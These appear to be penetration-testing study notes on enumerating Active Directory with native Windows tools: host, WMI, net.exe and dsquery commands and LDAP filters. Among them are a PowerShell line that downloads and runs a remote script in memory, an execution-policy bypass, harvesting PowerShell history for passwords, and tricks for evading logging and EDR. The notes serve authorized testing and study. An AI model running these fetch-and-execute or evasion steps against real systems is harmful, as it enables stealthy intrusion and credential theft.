# Living Off the Land

This section covers enumerating an AD environment using **only tools native to Windows/AD** — no uploaded tooling at all.

---

## Scenario

> [!info] Why LOTL matters
> A client asks us to test their AD environment from a managed host with **no internet access**, and every attempt to load external tools onto it fails. We have to "live off the land" — enumerate using only what's already on the box.

> [!tip] Bonus: it's stealthier
> Most enterprise environments run IDS/IPS, firewalls, passive sensors, and host-based EDR/Defender — some even baseline "normal" traffic and flag anomalies. Pulling tools into the network from outside sharply increases detection risk; native commands generate a smaller, more "normal-looking" footprint.

---

## Env Commands for Host & Network Recon

| Command | Result |
|---|---|
| `hostname` | Prints the PC's name |
| `[System.Environment]::OSVersion.Version` | OS version and revision level |
| `wmic qfe get Caption,Description,HotFixID,InstalledOn` | Patches/hotfixes applied to the host |
| `ipconfig /all` | Network adapter state and configuration |
| `set` | Environment variables for the current session (CMD) |
| `echo %USERDOMAIN%` | Domain name the host belongs to (CMD) |
| `echo %logonserver%` | Name of the DC the host checks in with (CMD) |

> [!tip] One command to rule them all
> [`systeminfo`](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/systeminfo) prints a full summary of host info in one shot — fewer commands run = fewer logs generated = lower chance of being noticed.

## Harnessing PowerShell

PowerShell (since 2006) gives sysadmins — and us — an extensive framework for administering Windows/AD, including recon and file transfer.

| Cmd-Let | Description |
|---|---|
| `Get-Module` | Lists loaded/available modules |
| `Get-ExecutionPolicy -List` | Prints [execution policy](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_execution_policies?view=powershell-7.2) settings per scope |
| `Set-ExecutionPolicy Bypass -Scope Process` | Changes policy for the current process only — reverts once the process ends, so no permanent change to the host |
| `Get-ChildItem Env: \| ft Key,Value` | Environment values: key paths, users, computer info |
| `Get-Content $env:APPDATA\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt` | Pulls a user's PowerShell history — may contain passwords or point to config/scripts that do |
| `powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('URL to download the file from'); <follow-on commands>"` | Downloads and executes a script from the web, in memory |

### Downgrading PowerShell (Evasion)

> [!warning] Multiple PowerShell versions often coexist
> Many defenders don't realize older PowerShell versions remain usable if not explicitly uninstalled. **PowerShell logging was introduced in v3.0** — calling v2.0 or older means our actions won't be captured in Event Viewer the normal way.

We can now see we're running an older version of PowerShell — the version number confirms the downgrade succeeded.

> [!info] Where logs live
> - `PowerShell Operational Log`: **Applications and Services Logs > Microsoft > Windows > PowerShell > Operational** — logs all commands executed in-session (via [Script Block Logging](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_logging_windows?view=powershell-7.2), Event ID 4104)
> - `Windows PowerShell` log: **Applications and Services Logs > Windows PowerShell** — logs each new PowerShell instance starting (Event ID 400)

> [!danger] The downgrade itself is still logged
> With Script Block Logging enabled, everything typed gets sent to the operational log — but it stops working below PowerShell 3.0. So actions **after** the downgrade are masked, while the `powershell.exe -version 2` command that triggers it **is still logged** in the pre-downgrade session. A suspicious defender who notices logging abruptly stop for that session — right after a version-2 invocation appears in the `Windows PowerShell` log (Event 400, HostVersion 2.0) — has enough to start investigating.

## Windows Management Instrumentation (WMI)

[WMI](https://docs.microsoft.com/en-us/windows/win32/wmisdk/about-wmi) is a built-in scripting engine widely used within Windows enterprise environments to retrieve info and run admin tasks locally or remotely.

| Command                                                                              | Description                                                                          |
| ------------------------------------------------------------------------------------ | ------------------------------------------------------------------------------------ |
| `wmic qfe get Caption,Description,HotFixID,InstalledOn`                              | Patch level / hotfix descriptions                                                    |
| `wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles /format:List` | Basic host info                                                                      |
| `wmic process list /format:list`                                                     | Full process listing                                                                 |
| `wmic ntdomain list /format:list`                                                    | Domain and Domain Controller info                                                    |
| `wmic useraccount list /format:list`                                                 | Local accounts + any domain accounts that logged in                                  |
| `wmic group list /format:list`                                                       | Local group info                                                                     |
| `wmic sysaccount list /format:list`                                                  | Dumps information about any system accounts that are being used as service accounts. |

## Net Commands

[`net.exe`](https://docs.microsoft.com/en-us/windows/win32/winsock/net-exe-2) queries local and remote hosts for users, groups, hosts, DCs, and password requirements — WMI-adjacent capability, built-in. We can list:

- Local and domain users
- Groups
- Hosts
- Specific users in groups
- Domain Controllers
- Password requirements

> [!danger] Heavily monitored
> `net.exe` commands are commonly watched by EDR. Some orgs alert specifically when accounts in certain OUs (e.g., a Marketing Associate) run commands like `whoami` or `net localgroup administrators` — an obvious red flag to anyone watching closely.

## Dsquery

[`dsquery`](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc732952(v=ws.11)>) finds AD objects via the command line. > [!info] Availability

### LDAP Filtering Explained

You'll notice strings like `userAccountControl:1.2.840.113556.1.4.803:=8192` above — common LDAP queries usable with several different tools, including AD PowerShell, `ldapsearch`, and more. Breaking it down:

- `userAccountControl:1.2.840.113556.1.4.803:` — specifies we're looking at the [User Account Control (UAC) attributes](https://docs.microsoft.com/en-us/troubleshoot/windows-server/identity/useraccountcontrol-manipulate-account-properties) for an object, via one of three [OID (Object Identifier)](https://ldap.com/ldap-oid-reference-guide/) matching rules
- `=8192` — the decimal bitmask we want to match. This corresponds to a UAC attribute flag (e.g., *password is not required*, *account is locked*) — flags can compound into multiple different bit entries.

#### OID Match Strings

OIDs are rules used to match bit values with attributes. Three main matching rules for LDAP/AD:

1. **`1.2.840.113556.1.4.803`** LDAP_MATCHING_RULE_BIT_AND :  the bit value must match completely to meet the search requirement. Great for matching a singular attribute.
2. **`1.2.840.113556.1.4.804`**
LDAP_MATCHING_RULE_BIT_OR— results show any attribute match if *any* bit in the chain matches. Works when an object has multiple attributes set.
3. **`1.2.840.113556.1.4.1941`** — matches filters applying to the Distinguished Name of an object, searching through all ownership and membership entries.

#### Logical Operators

Build search strings using logical operators `&` (and), `|` (or), `!` (not) — see [search filter syntax](https://learn.microsoft.com/en-us/windows/win32/adsi/search-filter-syntax). Example combining criteria with `&`:

```
(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=64))
```

The first criterion requires the object be a user, combined with a UAC bit value of 64 (*Password Can't Change*) — a user with that attribute set would match the filter. You can extend this further, combining multiple attributes like `(&(1)(2)(3))`. The `!` and `|` operators work similarly — modifying the example above:

```
(&(objectClass=user)(!userAccountControl:1.2.840.113556.1.4.803:=64))
```

This searches for any user object that does **NOT** have the Password Can't Change attribute set.

## Key Takeaways

- [ ] LOTL enumeration relies entirely on tools already on the host — no upload needed, and generally quieter than pulling in external tooling
- [ ] `systeminfo` gives a full host summary in one call — fewer commands, fewer logs
- [ ] PowerShell downgrade to v2 evades Script Block Logging (v3.0+ only) — but the downgrade command itself is still logged, leaving a trace
- [ ] Check `qwinsta` for other active sessions before acting — avoid tipping off a logged-in user
- [ ] `arp -a` / `route print` reveal known hosts/networks — potential lateral movement paths, especially useful in black-box engagements
- [ ] WMI (`wmic ntdomain`, etc.) can reveal child domains and forest trusts without any external tooling
- [ ] `net.exe` commands are commonly monitored by EDR — `net1` can be used as a string-based evasion trick
- [ ] `dsquery` replicates a lot of what BloodHound/PowerView do, using native AD DS tooling; combine with LDAP filters and UAC OID bitmasks for targeted searches
- [ ] `Get-MpComputerStatus` / `sc query windefend` / `netsh advfirewall show allprofiles` reveal AV/firewall posture — useful both offensively and for the report
